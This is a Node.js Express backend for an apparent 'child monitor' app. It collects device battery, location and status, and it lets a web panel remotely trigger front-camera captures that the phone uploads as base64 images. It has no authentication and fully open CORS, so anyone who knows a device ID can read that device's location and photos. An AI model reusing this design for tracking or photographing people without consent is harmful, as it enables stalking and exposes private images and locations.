// server.js
const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.json({ limit: "50mb" })); // allow large base64 images
app.use(cors());

// In-memory storage (for demo). You can later persist to DB.
let devices = {};

/*
Example devices structure:
devices = {
  "12345": {
    battery: "85%",
    location: "28.7,77.1",
    status: "online",
    lastUpdate: 169xxx,
    cameraImage: "<base64 string>",
    captureFrontCamera: false
  }
}
*/

// Helper: ensure device exists
function ensureDevice(id) {
  if (!devices[id]) {
    devices[id] = {
      battery: null,
      location: null,
      status: null,
      lastUpdate: null,
      cameraImage: null,
      captureFrontCamera: false
    };
  }
  return devices[id];
}

// POST /api/device/update
app.post("/api/device/update", (req, res) => {
  const { deviceId, battery, location, status } = req.body;
  if (!deviceId) return res.status(400).json({ error: "deviceId required" });

  const d = ensureDevice(deviceId);
  if (battery !== undefined) d.battery = battery;
  if (location !== undefined) d.location = location;
  if (status !== undefined) d.status = status;
  d.lastUpdate = new Date().toISOString();

  console.log(`[UPDATE] ${deviceId} battery=${d.battery} location=${d.location} status=${d.status}`);
  res.json({ success: true, device: d });
});

// GET /api/device/:deviceId  (generic)
app.get("/api/device/:deviceId", (req, res) => {
  const id = req.params.deviceId;
  const d = devices[id];
  if (!d) return res.status(404).json({ error: "Device not found" });
  return res.json(d);
});

// GET /api/device/:deviceId/status  (used by your web panel)
app.get("/api/device/:deviceId/status", (req, res) => {
  const id = req.params.deviceId;
  const d = devices[id];
  if (!d) return res.status(404).json({ error: "Device not found" });

  return res.json({
    battery: d.battery || "-",
    location: d.location || "-",
    status: d.status || "-",
    lastUpdate: d.lastUpdate || null
  });
});

// POST /api/device/camera-trigger  (web panel triggers this)
app.post("/api/device/camera-trigger", (req, res) => {
  const { deviceId } = req.body;
  if (!deviceId) return res.status(400).json({ error: "deviceId required" });

  const d = ensureDevice(deviceId);
  d.captureFrontCamera = true;
  console.log(`[TRIGGER] camera trigger set for ${deviceId}`);
  return res.json({ success: true, message: "Camera trigger set" });
});

// GET /api/device/:deviceId/camera-status  (app polls this)
app.get("/api/device/:deviceId/camera-status", (req, res) => {
  const id = req.params.deviceId;
  const d = devices[id];
  if (!d) return res.status(404).json({ error: "Device not found" });

  return res.json({ captureFrontCamera: !!d.captureFrontCamera });
});

// POST /api/frontcamera/upload  (app uploads base64 image)
app.post("/api/frontcamera/upload", (req, res) => {
  const { deviceId, imageBase64 } = req.body;
  if (!deviceId || !imageBase64) return res.status(400).json({ error: "deviceId and imageBase64 required" });

  const d = ensureDevice(deviceId);
  d.cameraImage = imageBase64;
  d.captureFrontCamera = false;
  d.lastUpdate = new Date().toISOString();

  console.log(`[UPLOAD] image received from ${deviceId} (size=${imageBase64.length} chars)`);
  return res.json({ success: true, message: "Image uploaded" });
});

// GET /api/frontcamera/latest/:deviceId  (web panel fetch latest)
app.get("/api/frontcamera/latest/:deviceId", (req, res) => {
  const id = req.params.deviceId;
  const d = devices[id];
  if (!d) return res.status(404).json({ error: "Device not found" });

  return res.json({
    imageBase64: d.cameraImage || null,
    lastUpdate: d.lastUpdate || null
  });
});

// simple root
app.get("/", (req, res) => {
  res.send("Child Monitor Server is running.");
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
